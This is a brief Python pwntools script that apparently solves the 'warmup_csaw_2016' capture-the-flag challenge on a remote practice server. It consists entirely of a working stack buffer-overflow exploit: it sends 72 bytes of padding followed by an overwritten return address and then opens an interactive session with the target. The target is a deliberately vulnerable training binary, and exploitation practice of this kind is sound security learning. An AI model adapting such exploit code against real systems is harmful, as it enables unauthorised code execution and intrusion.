from pwn import *
# sh = process('./warmup_csaw_2016')
sh = remote('node5.buuoj.cn', 27947)

payoad = b'a'*72 + p64(0x40060D)

sh.sendline(payoad)
sh.interactive()